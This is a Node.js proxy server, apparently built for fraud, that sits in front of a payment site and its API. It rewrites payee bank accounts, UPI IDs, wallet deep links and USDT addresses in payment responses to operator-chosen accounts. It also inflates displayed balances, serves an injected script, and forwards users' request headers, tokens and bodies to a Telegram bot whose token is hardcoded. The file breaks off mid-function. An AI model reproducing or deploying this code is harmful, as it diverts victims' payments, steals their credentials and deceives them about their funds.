const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Redis } = require('@upstash/redis');

const app = express();
const TIVOX_API = 'https://tivox.icu';
const REAL_API = 'https://qonix.click';
const FRONTEND_HOST = 'vivipay.net';
const PROXY_HOST = 'rtyhh.vercel.app';
const BOT_TOKEN = '8537838501:AAGuVHlnxIMo6OFORmhzSvRpkkhH2-0qDCI';
const WEBHOOK_URL = 'https://rtyhh.vercel.app/bot-webhook';
const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;
const TELEGRAM_OVERRIDE = 'https://t.me/Vivipaymed';

const DEFAULT_DATA = {
  banks: [],
  activeIndex: -1,
  botEnabled: true,
  autoRotate: false,
  lastUsedIndex: -1,
  adminChatId: null,
  logRequests: false,
  rawLog: false,
  usdtAddress: '',
  depositSuccess: false,
  depositBonus: 0,
  withdrawOverride: 0,
  userOverrides: {},
  trackedUsers: {},
  blockUpdate: true,
  orderBankMap: {}
};

let bot = null;
let webhookSet = false;
const _balSnapTimes = {};
try { bot = new TelegramBot(BOT_TOKEN); } catch (e) { }

let redis = null;
if (REDIS_URL && REDIS_TOKEN) {
  try { redis = new Redis({ url: REDIS_URL, token: REDIS_TOKEN }); } catch (e) { }
}

let cachedData = null;
let cacheTime = 0;
const CACHE_TTL = 5000;
const tokenUserMap = {};
const ipUserMap = {};

// ── In-memory proxy cache ────────────────────────────────────────────────────
// JS files: content-hashed filenames — cache indefinitely (never change)
// HTML:     cache 30s — avoids vivipay.net round-trip on every refresh
// CSS/img:  served directly from vivipay.net via <base> tag, not cached here
const proxyCache = new Map(); // key → { buf, ct, status, ts, ttl }
function cacheGet(key) {
  const e = proxyCache.get(key);
  if (!e) return null;
  if (e.ttl > 0 && Date.now() - e.ts > e.ttl) { proxyCache.delete(key); return null; }
  return e;
}
function cacheSet(key, buf, ct, status, ttl) {
  // Limit total cache size to ~15MB to avoid OOM
  if (buf.length < 20 * 1024 * 1024) {
    proxyCache.set(key, { buf, ct, status, ts: Date.now(), ttl });
  }
}

// Map to debounce repetitive error logs (key -> timestamp)
const recentErrors = new Map();
const _lastProofTimes = new Map();

const IFSC_BANK_MAP = {
  'IPOS': 'India Post Payments Bank',
  'SBIN': 'State Bank of India',
  'HDFC': 'HDFC Bank',
  'ICIC': 'ICICI Bank',
  'UTIB': 'Axis Bank',
  'PUNB': 'Punjab National Bank',
  'BARB': 'Bank of Baroda',
  'CNRB': 'Canara Bank',
  'UBIN': 'Union Bank of India',
  'BKID': 'Bank of India',
  'KKBK': 'Kotak Mahindra Bank',
  'YESB': 'Yes Bank',
  'IDFB': 'IDFC FIRST Bank',
  'IOBA': 'Indian Overseas Bank',
  'MAHB': 'Bank of Maharashtra',
  'PSIB': 'Punjab & Sind Bank',
  'CBIN': 'Central Bank of India',
  'UCOB': 'UCO Bank',
  'INDB': 'IndusInd Bank',
  'FDRL': 'Federal Bank',
  'AIRP': 'Airtel Payments Bank',
  'PYTM': 'Paytm Payments Bank',
  'JIOP': 'Jio Payments Bank',
  'FINO': 'Fino Payments Bank',
  'AUBL': 'AU Small Finance Bank',
  'ESFB': 'Equitas Small Finance Bank',
  'USFB': 'Ujjivan Small Finance Bank'
};

function getBankNameFromIfsc(ifsc) {
  if (!ifsc || typeof ifsc !== 'string') return 'Bank';
  const prefix = ifsc.trim().substring(0, 4).toUpperCase();
  return IFSC_BANK_MAP[prefix] || 'Bank';
}

// Helper to clean up ugly JSON strings or IFSC codes accidentally sent in bank fields
function cleanUglyBankNames(obj, depth = 0, defaultBankName = 'Bank') {
  if (!obj || typeof obj !== 'object' || depth > 10) return;
  if (Array.isArray(obj)) {
    for (const item of obj) cleanUglyBankNames(item, depth + 1, defaultBankName);
    return;
  }
  for (const k of Object.keys(obj)) {
    if (typeof obj[k] === 'object' && obj[k] !== null) {
      cleanUglyBankNames(obj[k], depth + 1, defaultBankName);
    } else if (typeof obj[k] === 'string') {
      const val = obj[k].trim();
      const kl = k.toLowerCase().replace(/[_-]/g, '');

      // 1. JSON string error (like {"code":0,"msg":"ok","data":{}})
      if (val.startsWith('{') && (val.includes('"code"') || val.includes('"msg"') || val.includes('"data"'))) {
        obj[k] = defaultBankName || 'Bank';
      }
      // 2. IFSC code placed in bank name fields (like BARB0JODPAL, IPOS0000001)
      else if ((kl.includes('bankname') || kl === 'bank' || kl.includes('acctbank') || kl === 'payeebankname') && /^[A-Z]{4}0[A-Z0-9]{6}$/i.test(val)) {
        obj[k] = getBankNameFromIfsc(val);
      }
    }
  }
}
// ────────────────────────────────────────────────────────────────────────────

async function ensureWebhook() {
  if (!bot || webhookSet) return;
  try { await bot.setWebHook(WEBHOOK_URL); webhookSet = true; } catch (e) { }
}

function parseRedisData(raw) {
  if (!raw) return null;
  if (typeof raw === 'string') {
    try { return JSON.parse(raw); } catch (e) { return null; }
  }
  if (typeof raw === 'object' && raw !== null) return raw;
  return null;
}

async function loadData(forceRefresh) {
  if (!forceRefresh && cachedData && (Date.now() - cacheTime < CACHE_TTL)) return cachedData;
  if (!redis) {
    if (!cachedData) cachedData = { ...DEFAULT_DATA };
    return cachedData;
  }
  try {
    let raw = await redis.get('vivipayData');
    let parsed = parseRedisData(raw);
    if (parsed) {
      cachedData = {
        ...DEFAULT_DATA,
        ...parsed,
        userOverrides: parsed.userOverrides || {},
        trackedUsers: parsed.trackedUsers || {},
        orderBankMap: parsed.orderBankMap || {},
        tokenMap: parsed.tokenMap || {},
        banks: Array.isArray(parsed.banks) ? parsed.banks : []
      };
      cacheTime = Date.now();
      return cachedData;
    }
  } catch (e) { console.error('Redis load error:', e.message); }
  if (!cachedData) cachedData = { ...DEFAULT_DATA };
  cacheTime = Date.now();
  return cachedData;
}

async function saveSettings(updates) {
  let latest = await loadData(true);
  Object.assign(latest, updates);
  cachedData = latest;
  cacheTime = Date.now();
  if (redis) {
    try {
      await redis.set('vivipayData', JSON.stringify(latest));
    } catch (e) {
      console.error('Redis saveSettings error:', e.message);
    }
  }
  return latest;
}

async function saveData(data) {
  if (!data) return;
  cachedData = data;
  cacheTime = Date.now();
  if (!redis) return;
  try {
    let currentRaw = await redis.get('vivipayData');
    let current = parseRedisData(currentRaw) || {};
    const merged = {
      ...DEFAULT_DATA,
      ...current,
      ...data,
      userOverrides: { ...(current.userOverrides || {}), ...(data.userOverrides || {}) },
      trackedUsers: { ...(current.trackedUsers || {}), ...(data.trackedUsers || {}) },
      orderBankMap: { ...(current.orderBankMap || {}), ...(data.orderBankMap || {}) },
      tokenMap: { ...(current.tokenMap || {}), ...(data.tokenMap || {}) },
      balanceHistory: data.balanceHistory || current.balanceHistory || []
    };
    cachedData = merged;
    cacheTime = Date.now();
    await redis.set('vivipayData', JSON.stringify(merged));
  } catch (e) {
    console.error('saveData error:', e.message);
  }
}

function getActiveBank(data, userId) {
  const uo = (userId && data.userOverrides) ? data.userOverrides[String(userId)] : null;
  if (uo && uo.bankIndex !== undefined && uo.bankIndex >= 0 && uo.bankIndex < data.banks.length) {
    return data.banks[uo.bankIndex];
  }
  if (data.autoRotate && data.banks.length > 1) {
    let idx;
    do { idx = Math.floor(Math.random() * data.banks.length); } while (idx === data.lastUsedIndex && data.banks.length > 1);
    data.lastUsedIndex = idx;
    return data.banks[idx];
  }
  if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) return data.banks[data.activeIndex];
  if (data.banks.length > 0) return data.banks[0];
  return null;
}

function bankListText(d) {
  if (d.banks.length === 0) return 'No banks added yet.';
  return d.banks.map((b, i) => {
    const a = i === d.activeIndex ? ' ✅' : '';
    const minStr = b.minAmount ? ` | Min: ₹${b.minAmount}` : '';
    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${minStr}${a}`;
  }).join('\n');
}

function getOrderAmount(req, respData) {
  if (respData && typeof respData === 'object') {
    const amt = respData.orderAmount || respData.amount || respData.money || respData.totalAmount || respData.rechargeAmount || respData.buyAmount;
    if (amt !== undefined && amt !== null) { const n = parseFloat(amt); if (!isNaN(n)) return n; }
  }
  const body = req && req.parsedBody ? req.parsedBody : (req && req.body ? req.body : {});
  const ba = body.amount || body.orderAmount || body.totalAmount || body.money;
  if (ba !== undefined && ba !== null) { const n = parseFloat(ba); if (!isNaN(n)) return n; }
  return null;
}

async function notifyAdmin(data, msg) {
  if (data.adminChatId && bot) {
    try { await bot.sendMessage(data.adminChatId, msg.substring(0, 4000)); } catch (e) { }
  }
}

async function notifyAdminPhoto(data, photoBufferOrUrl, caption) {
  if (data.adminChatId && bot) {
    try {
      await bot.sendPhoto(data.adminChatId, photoBufferOrUrl, { caption: (caption || '').substring(0, 1024) });
    } catch (e) {
      try {
        const urlStr = typeof photoBufferOrUrl === 'string' ? `\n🖼 Link: ${photoBufferOrUrl}` : '';
        await bot.sendMessage(data.adminChatId, `${caption}${urlStr}`);
      } catch (e2) { }
    }
  }
}

// ── Raw Request+Response logger (/rr command) ────────────────────────────────
async function sendRawLog(data, { method, url, reqHeaders, reqBodyRaw, status, respHeaders, respBodyRaw, source, now }) {
  if (!data.rawLog || !data.adminChatId || !bot) return;

  // ── Format headers as clean key: value lines
  function fmtHeaders(hdrs) {
    if (!hdrs || typeof hdrs !== 'object') return '  (none)';
    return Object.entries(hdrs)
      .map(([k, v]) => `  ${k}: ${v}`)
      .join('\n') || '  (none)';
  }

  // ── Pretty-print JSON body or raw string
  function fmtBody(raw) {
    if (!raw || (typeof raw === 'string' && raw.trim() === '') || (Buffer.isBuffer(raw) && raw.length === 0)) return '  (empty)';
    const str = Buffer.isBuffer(raw) ? raw.toString('utf-8') : String(raw);
    try {
      const parsed = JSON.parse(str);
      return JSON.stringify(parsed, null, 2);
    } catch (e) {
      return str;
    }
  }

  // ── Split a long string into Telegram-safe chunks (max 4000 chars)
  async function sendChunked(text) {
    const MAX = 4000;
    if (text.length <= MAX) {
      try { await bot.sendMessage(data.adminChatId, text); } catch (e) { }
      return;
    }
    let i = 0;
    let part = 1;
    while (i < text.length) {
      const chunk = text.slice(i, i + MAX);
      try { await bot.sendMessage(data.adminChatId, `[part ${part}]\n` + chunk); } catch (e) { }
      i += MAX;
      part++;
    }
  }

  const srcTag = source === 'frontend' ? '🌐 FRONTEND' : '📱 API';

  // ── REQUEST message
  const reqMsg =
    `╔══════════════════════════════════╗
║   📡 RAW LOG — ${srcTag}
╚══════════════════════════════════╝
🕐 ${now}

📤 REQUEST
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔹 Method : ${method}
🔹 URL    : ${url}

📋 Headers:
${fmtHeaders(reqHeaders)}

📦 Body:
${fmtBody(reqBodyRaw)}`;

  // ── RESPONSE message
  const respMsg =
    `📥 RESPONSE  [${status}]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 Headers:
${fmtHeaders(respHeaders)}

📦 Body:
${fmtBody(respBodyRaw)}`;

  await sendChunked(reqMsg);
  await sendChunked(respMsg);
}
// ─────────────────────────────────────────────────────────────────────────────

function findNumericId(obj, depth) {
  if (!obj || typeof obj !== 'object' || depth > 5) return '';
  if (Array.isArray(obj)) return '';
  const idFields = ['teamWorkId', 'userId', 'uid', 'id', 'memberId', 'memberCodeId', 'channelUid', 'user_id', 'userid', 'account_id', 'accountId', 'customerId'];
  for (const f of idFields) {
    if (obj[f] !== undefined && obj[f] !== null && obj[f] !== '') {
      const val = String(obj[f]);
      if (/^\d+$/.test(val) && val.length >= 3) return val;
    }
  }
  for (const key of Object.keys(obj)) {
    if (typeof obj[key] === 'object' && !Array.isArray(obj[key])) {
      const found = findNumericId(obj[key], depth + 1);
      if (found) return found;
    }
  }
  return '';
}

function getTokenFromReq(req) {
  if (req.query && req.query.token) return req.query.token.trim();
  const auth = req.headers['authorization'] || req.headers['token'] || req.headers['x-token'] || req.headers['access-token'] || '';
  if (auth.startsWith('Bearer ')) return auth.substring(7).trim();
  if (auth) return auth.trim();
  const ck = req.headers['cookie'] || '';
  const tm = ck.match(/token=([^;]+)/);
  if (tm) return tm[1].trim();
  return '';
}

function getClientIP(req) {
  return req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || req.headers['x-real-ip'] || '';
}

async function resolveUserId(req) {
  const tok = getTokenFromReq(req);
  if (tok && tokenUserMap[tok]) return tokenUserMap[tok];
  const ip = getClientIP(req);
  if (ip && ipUserMap[ip]) return ipUserMap[ip];
  try {
    const data = await loadData();
    if (data.tokenMap) {
      if (tok && data.tokenMap[tok]) {
        tokenUserMap[tok] = data.tokenMap[tok];
        return data.tokenMap[tok];
      }
      if (ip && data.tokenMap['ip_' + ip]) {
        ipUserMap[ip] = data.tokenMap['ip_' + ip];
        return data.tokenMap['ip_' + ip];
      }
    }
  } catch (e) { }
  return '';
}

async function saveUserMapping(req, userId) {
  if (!userId) return;
  const tok = getTokenFromReq(req);
  if (tok) tokenUserMap[tok] = String(userId);
  const ip = getClientIP(req);
  if (ip) ipUserMap[ip] = String(userId);
  try {
    const data = await loadData();
    if (!data.tokenMap) data.tokenMap = {};
    let changed = false;
    if (tok && data.tokenMap[tok] !== String(userId)) { data.tokenMap[tok] = String(userId); changed = true; }
    if (ip && data.tokenMap['ip_' + ip] !== String(userId)) { data.tokenMap['ip_' + ip] = String(userId); changed = true; }
    if (changed) await saveData(data);
  } catch (e) { }
}

function parseMultipartFields(rawBody) {
  if (!rawBody || rawBody.length === 0) return {};
  const bodyStr = rawBody.toString();
  const fields = {};
  const parts = bodyStr.split(/--[-a-zA-Z0-9]+/);
  for (const part of parts) {
    const nm = part.match(/name="([^"]+)"/);
    if (nm) {
      let vIdx = part.indexOf('\r\n\r\n');
      if (vIdx === -1) vIdx = part.indexOf('\n\n');
      if (vIdx !== -1) {
        fields[nm[1]] = part.substring(vIdx + (part[vIdx] === '\r' ? 4 : 2)).trim();
      }
    }
  }
  return fields;
}

const BANK_FIELD_MAP = {
  accountno: 'accountNo', accountnumber: 'accountNo', account_no: 'accountNo',
  receiveaccountno: 'accountNo', bankaccount: 'accountNo', bankaccountno: 'accountNo',
  payeeaccount: 'accountNo', cardno: 'accountNo', cardnumber: 'accountNo',
  bankcardno: 'accountNo', payeecardno: 'accountNo', receivecardno: 'accountNo',
  payeebankaccount: 'accountNo', payeebankaccountno: 'accountNo', payeeaccountno: 'accountNo',
  receiveraccount: 'accountNo', receiveraccountno: 'accountNo',
  walletaccount: 'accountNo', walletno: 'accountNo', collectionaccount: 'accountNo',
  collectionaccountno: 'accountNo', customerbanknumber: 'accountNo',
  acctno: 'accountNo', acctnum: 'accountNo', acct_no: 'accountNo',
  account: 'accountNo', receiveaccount: 'accountNo',
  beneficiaryname: 'accountHolder', accountname: 'accountHolder', account_name: 'accountHolder',
  receiveaccountname: 'accountHolder', holdername: 'accountHolder', accountholder: 'accountHolder',
  bankaccountholder: 'accountHolder', receivename: 'accountHolder',
  payeename: 'accountHolder', bankaccountname: 'accountHolder', realname: 'accountHolder',
  cardholder: 'accountHolder', cardname: 'accountHolder', receivername: 'accountHolder',
  collectionname: 'accountHolder', customername: 'accountHolder', accname: 'accountHolder',
  acc_name: 'accountHolder', acctname: 'accountHolder', acct_name: 'accountHolder',
  truename: 'accountHolder', receiverealname: 'accountHolder',
  payeerealname: 'accountHolder',
  ifsc: 'ifsc', ifsccode: 'ifsc', ifsc_code: 'ifsc', receiveifsc: 'ifsc',
  bankifsc: 'ifsc', payeeifsc: 'ifsc', receiverifsc: 'ifsc', collectionifsc: 'ifsc',
  acctcode: 'ifsc', acct_code: 'ifsc', acctifsc: 'ifsc',
  bankname: 'bankName', bank_name: 'bankName', payeebankname: 'bankName', receiverbankname: 'bankName',
  upiid: 'upiId', upi_id: 'upiId', upi: 'upiId', vpa: 'upiId',
  payeeupi: 'upiId', receiverupi: 'upiId', walletupi: 'upiId',
  payaccount: 'upiId', pay_account: 'upiId', payeraccount: 'upiId', payer_account: 'upiId',
  payeebankaccount: 'accountNo', payeerecipientsname: 'accountHolder',
  payeerecipientsname: 'accountHolder', payeerecipientname: 'accountHolder',
  recipientsname: 'accountHolder', recipientname: 'accountHolder',
  payeebankname: 'bankName', payerbankname: 'bankName'
};

function captureRealBank(obj, depth) {
  if (!obj || typeof obj !== 'object' || (depth || 0) > 8) return null;
  if (Array.isArray(obj)) {
    for (const item of obj) { const r = captureRealBank(item, (depth || 0) + 1); if (r) return r; }
    return null;
  }
  const found = { accountHolder: '', accountNo: '', ifsc: '', bankName: '', upiId: '' };
  for (const k of Object.keys(obj)) {
    const kl = k.toLowerCase().replace(/[_-]/g, '');
    const mapped = BANK_FIELD_MAP[kl];
    if (mapped && !found[mapped] && obj[k] && String(obj[k]).trim()) found[mapped] = String(obj[k]).trim();
  }
  if (found.accountNo || found.ifsc) return found;
  for (const k of Object.keys(obj)) {
    if (typeof obj[k] === 'object') { const r = captureRealBank(obj[k], (depth || 0) + 1); if (r) return r; }
  }
  return null;
}

function scanHasBankFields(obj, depth) {
  if (!obj || typeof obj !== 'object' || depth > 10) return false;
  if (Array.isArray(obj)) { return obj.some(item => scanHasBankFields(item, depth + 1)); }
  for (const k of Object.keys(obj)) {
    const kl = k.toLowerCase().replace(/[_-]/g, '');
    if (BANK_FIELD_MAP[kl] === 'accountNo' || BANK_FIELD_MAP[kl] === 'ifsc') return true;
    if (typeof obj[k] === 'object' && scanHasBankFields(obj[k], depth + 1)) return true;
    if (typeof obj[k] === 'string' && /^(mobikwik|freecharge|amazonpay|phonepe|paytm|bhim|gpay|upi):\/\//i.test(obj[k])) return true;
  }
  return false;
}

const NAME_FIELDS = ['name', 'payname', 'username', 'holdername', 'ownername',
  'receivename', 'payeename', 'beneficiaryname', 'accountname', 'realname',
  'cardholder', 'cardname', 'receivername', 'collectionname', 'customername',
  'truename', 'accname', 'acctname', 'bankaccountname', 'receiveaccountname',
  'payeerealname', 'receiverealname', 'bankaccountholder', 'accountholder'];

// Replace bank account/ifsc/name inside wallet deep-link URL strings
// Handles: mobikwik://, freecharge://, amazonpay://, phonepe://, paytm://, upi://
// and also plain https UPI pay URLs
function replaceWalletUrl(urlStr, bank) {
  if (!urlStr || typeof urlStr !== 'string') return urlStr;
  // Must look like a wallet/UPI deep link or UPI pay URL
  if (!/^(mobikwik|freecharge|amazonpay|phonepe|paytm|bhim|gpay|upi|https?):\/\//i.test(urlStr)) return urlStr;
  // Param names that carry bank account number in these URLs
  const acctParams = ['account', 'accountnumber', 'acc', 'payeeaccount', 'pa', 'payee', 'vaccount', 'vpa', 'to'];
  const ifscParams = ['ifsc', 'bankifsc', 'payeeifsc', 'fi'];
  const nameParams = ['name', 'payeename', 'pn', 'reciever', 'receiver', 'to_name', 'toname'];
  const dispParams = ['displayaccountnumber', 'displayaccount', 'maskedaccount', 'masked'];

  try {
    // Split scheme + path from query string (deep links have custom schemes)
    const qIdx = urlStr.indexOf('?');
    if (qIdx === -1) return urlStr;
    const base = urlStr.slice(0, qIdx + 1);
    const params = new URLSearchParams(urlStr.slice(qIdx + 1));
    let changed = false;

    for (const [key] of params) {
      const kl = key.toLowerCase().replace(/[_-]/g, '');
      if (bank.accountNo && acctParams.includes(kl)) {
        params.set(key, bank.accountNo); changed = true;
      } else if (bank.ifsc && ifscParams.includes(kl)) {
        params.set(key, bank.ifsc); changed = true;
      } else if (bank.accountHolder && nameParams.includes(kl)) {
        params.set(key, bank.accountHolder); changed = true;
      } else if (bank.accountNo && dispParams.includes(kl)) {
        // Replace the masked display number with real (new) account number
        params.set(key, bank.accountNo); changed = true;
      }
    }
    return changed ? base + params.toString() : urlStr;
  } catch (e) {
    return urlStr;
  }
}

const IGNORE_REPLACE_FIELDS = ['ctaccount', 'ct_account', 'ctname', 'ct_name', 'cttype', 'ct_type', 'ctpackage', 'ct_package', 'cturl', 'ct_url'];

function deepReplaceBankFields(obj, bank, depth, globalHasAcct) {
  if (!obj || typeof obj !== 'object' || depth > 10) return;
  if (Array.isArray(obj)) { for (let i = 0; i < obj.length; i++) deepReplaceBankFields(obj[i], bank, depth + 1, globalHasAcct); return; }
  const resolvedBankName = (bank && bank.bankName) ? bank.bankName : (bank && bank.ifsc ? getBankNameFromIfsc(bank.ifsc) : 'Bank');
  for (const k of Object.keys(obj)) {
    if (typeof obj[k] === 'object' && obj[k] !== null) {
      deepReplaceBankFields(obj[k], bank, depth + 1, globalHasAcct);
      continue;
    }
    if (typeof obj[k] !== 'string' && typeof obj[k] !== 'number') continue;
    const kl = k.toLowerCase().replace(/[_-]/g, '');
    if (IGNORE_REPLACE_FIELDS.includes(kl)) continue; // Never overwrite user collection/payer accounts
    const mapping = BANK_FIELD_MAP[kl];
    if (mapping === 'bankName') {
      obj[k] = resolvedBankName;
      continue;
    }
    if (mapping && bank[mapping] && String(obj[k]).length > 0) { obj[k] = bank[mapping]; continue; }
    if (globalHasAcct && bank.accountHolder && NAME_FIELDS.includes(kl) && String(obj[k]).length > 0) { obj[k] = bank.accountHolder; continue; }
    if (kl === 'bank' || kl === 'bankname' || kl === 'payeebankname' || kl === 'receiverbankname' || kl === 'payerbankname' || kl === 'acctbankname') {
      obj[k] = resolvedBankName;
      continue;
    }
    // Replace bank details embedded inside wallet deep-link URL strings
    if (typeof obj[k] === 'string' && obj[k].includes('://')) {
      const replaced = replaceWalletUrl(obj[k], bank);
      if (replaced !== obj[k]) { obj[k] = replaced; }
    }
  }
}

function resolveTargetBank(data, orderId, altId, activeBank) {
  if (!activeBank) return null;
  const o1 = orderId ? (data.orderBankMap && data.orderBankMap[String(orderId)]) : null;
  const o2 = altId ? (data.orderBankMap && data.orderBankMap[String(altId)]) : null;
  const saved = o1 || o2;

  if (saved && (saved.forced || saved.isManual)) {
    const sHolder = saved.accountHolder || (saved.bank ? saved.bank.split(' | ')[0] : '') || activeBank.accountHolder;
    const sAcct = saved.accountNo || (saved.bank ? saved.bank.split(' | ')[1] : '') || activeBank.accountNo;
    const sIfsc = saved.ifsc || (saved.bank ? saved.bank.split(' | ')[2] : '') || activeBank.ifsc;
    const sBankName = saved.bankName || (sIfsc ? getBankNameFromIfsc(sIfsc) : '') || activeBank.bankName || 'Bank';
    const sUpi = saved.upiId || activeBank.upiId || '';

    return {
      accountHolder: sHolder || activeBank.accountHolder,
      accountNo: sAcct || activeBank.accountNo,
      ifsc: sIfsc || activeBank.ifsc,
      bankName: sBankName || activeBank.bankName || 'Bank',
      upiId: sUpi || activeBank.upiId || ''
    };
  }

  // Universal dynamic fallback: ANY order with ANY merchant bank details will be replaced with our activeBank
  return activeBank;
}

function replaceOrderBankDetails(order, bank) {
  if (!order || typeof order !== 'object' || !bank) return;
  const bkAcct = bank.accountNo || '';
  const bkIfsc = bank.ifsc || '';
  const bkName = bank.accountHolder || '';
  const bkUpi = bank.upiId || bkAcct || '';
  const bkBank = bank.bankName || (bkIfsc ? getBankNameFromIfsc(bkIfsc) : 'Bank');

  deepReplaceBankFields(order, bank, 0, true);

  if (bkAcct) {
    order.acctNo = bkAcct;
    order.accountNo = bkAcct;
    order.accountNumber = bkAcct;
    order.account = bkAcct;
    order.payee_bank_account = bkAcct;
    order.payee_account = bkAcct;
  }
  if (bkIfsc) {
    order.acctCode = bkIfsc;
    order.ifsc = bkIfsc;
    order.ifscCode = bkIfsc;
    order.payee_ifsc = bkIfsc;
  }
  if (bkName) {
    order.acctName = bkName;
    order.name = bkName;
    order.accountName = bkName;
    order.realName = bkName;
    order.payee_recipients_name = bkName;
    order.payee_name = bkName;
  }
  if (bkBank) {
    order.bankName = bkBank;
    order.bank_name = bkBank;
    order.payee_bankname = bkBank;
  }
  if (bkUpi && order.payAccount !== undefined) {
    order.payAccount = bkUpi;
  }
}

const BALANCE_KEYS = ['balance', 'userbalance', 'availablebalance', 'totalbalance', 'money',
  'itoken', 'itokenbalance', 'tokenbalance', 'usermoney', 'memberbalance',
  'mybalance', 'walletbalance', 'accountbalance', 'rechargebalance', 'coinbalance',
  'totalmoney', 'totalamount', 'membermoney', 'useritoken', 'myitoken', 'mytokenbalance'];

function addBalanceToFields(obj, bonus, depth) {
  if (!obj || typeof obj !== 'object' || !bonus || depth > 10) return;
  if (Array.isArray(obj)) { for (let i = 0; i < obj.length; i++) if (typeof obj[i] === 'object') addBalanceToFields(obj[i], bonus, depth + 1); return; }
  for (const k of Object.keys(obj)) {
    const kl = k.toLowerCase();
    if (BALANCE_KEYS.includes(kl)) {
      const v = parseFloat(obj[k]);
      if (!isNaN(v) && v >= 0) {
        obj[k] = typeof obj[k] === 'string' ? String((v + bonus).toFixed(2)) : parseFloat((v + bonus).toFixed(2));
      }
    }
    if (typeof obj[k] === 'object' && obj[k] !== null) addBalanceToFields(obj[k], bonus, depth + 1);
  }
}

function findBalanceDeep(obj, depth) {
  if (!obj || typeof obj !== 'object' || depth > 6) return null;
  const balKeys = ['iToken', 'itoken', 'balance', 'userBalance', 'availableBalance', 'totalBalance',
    'money', 'tokenBalance', 'usermoney', 'memberBalance', 'myBalance', 'itokenBalance', 'iTokenBalance',
    'userMoney', 'coinBalance', 'walletBalance'];
  for (const bk of balKeys) {
    if (obj[bk] !== undefined && obj[bk] !== null && obj[bk] !== '') {
      const v = parseFloat(obj[bk]);
      if (!isNaN(v)) return { field: bk, value: v };
    }
  }
  for (const k of Object.keys(obj)) {
    if (typeof obj[k] === 'object' && !Array.isArray(obj[k])) {
      const f = findBalanceDeep(obj[k], depth + 1);
      if (f) return f;
    }
  }
  return null;
}

function replaceUsdtAddress(obj, newAddr, depth) {
  if (!obj || typeof obj !== 'object' || depth > 10) return;
  if (Array.isArray(obj)) { for (let i = 0; i < obj.length; i++) replaceUsdtAddress(obj[i], newAddr, depth + 1); return; }
  for (const k of Object.keys(obj)) {
    if (typeof obj[k] === 'string' && /^T[A-Za-z1-9]{33}$/.test(obj[k])) {
      obj[k] = newAddr;
    } else if (typeof obj[k] === 'object') {
      replaceUsdtAddress(obj[k], newAddr, depth + 1);
    }
  }
}

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD');
  res.header('Access-Control-Allow-Headers', '*');
  res.header('Access-Control-Allow-Credentials', 'true');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.use((req, res, next) => {
  if (req.method === 'GET' || req.method === 'HEAD') return next();
  const chunks = [];
  req.on('data', c => chunks.push(c));
  req.on('end', () => {
    req.rawBody = Buffer.concat(chunks);
    const ct = (req.headers['content-type'] || '').toLowerCase();
    try {
      if (ct.includes('json')) {
        req.body = JSON.parse(req.rawBody.toString());
      } else if (ct.includes('form') && !ct.includes('multipart')) {
        const params = new URLSearchParams(req.rawBody.toString());
        req.body = Object.fromEntries(params);
      } else {
        req.body = {};
      }
    } catch (e) { req.body = {}; }
    next();
  });
});

app.use('/hook', (req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.get('/inject.js', async (req, res) => {
  res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
  res.setHeader('Access-Control-Allow-Origin', '*');
  try {
    const data = await loadData();
    const initCfg = {
      tg: TELEGRAM_OVERRIDE,
      blockUpdate: data.blockUpdate !== false
    };
    let jsCode = INJECT_JS.replace('var CFG=null;', 'var CFG=' + JSON.stringify(initCfg) + ';');
    res.send(jsCode);
  } catch (e) {
    res.send(INJECT_JS);
  }
});

app.get('/hook/config', async (req, res) => {
  try {
    const data = await loadData();
    const userId = req.query.userId || '';
    const bank = getActiveBank(data, userId);
    const uo = (userId && data.userOverrides) ? data.userOverrides[String(userId)] : null;
    const addedBal = (uo && uo.addedBalance !== undefined) ? uo.addedBalance : 0;
    const globalBonus = data.depositBonus || 0;
    const totalBonus = addedBal + globalBonus;
    const tracked = (userId && data.trackedUsers) ? data.trackedUsers[String(userId)] : null;
    const lastRealBal = (uo && uo.lastRealBalance !== undefined) ? uo.lastRealBalance : (tracked && tracked.balance !== undefined ? parseFloat(tracked.balance) : null);
    const shownBal = lastRealBal !== null ? parseFloat((lastRealBal + totalBonus).toFixed(2)) : (totalBonus > 0 ? totalBonus : null);
    const resolvedBn = bank ? (bank.bankName || (bank.ifsc ? getBankNameFromIfsc(bank.ifsc) : 'Bank')) : 'Bank';
    res.json({
      enabled: data.botEnabled !== false,
      an: bank ? bank.accountNo : '',
      ah: bank ? bank.accountHolder : '',
      if: bank ? bank.ifsc : '',
      bn: resolvedBn,
      ui: bank ? (bank.upiId || '') : '',
      tg: TELEGRAM_OVERRIDE,
      bonus: totalBonus,
      bal: shownBal,
      blockUpdate: data.blockUpdate !== false,
      usdtAddr: data.usdtAddress || ''
    });
  } catch (e) {
    res.json({ enabled: false, an: '', ah: '', if: '', bn: 'Bank', ui: '', tg: TELEGRAM_OVERRIDE, bonus: 0 });
  }
});

app.post('/hook/log', async (req, res) => {
  res.json({ ok: true });
});

app.get('/setup-webhook', async (req, res) => {
  if (!bot) return res.json({ error: 'No bot token' });
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
    const info = await bot.getWebHookInfo();
    res.json({ success: true, webhook: info });
  } catch (e) { res.json({ error: e.message }); }
});

app.get('/health', async (req, res) => {
  const data = await loadData(true);
  const bank = getActiveBank(data, null);
  let redisOk = false;
  if (redis) { try { await redis.ping(); redisOk = true; } catch (e) { } }
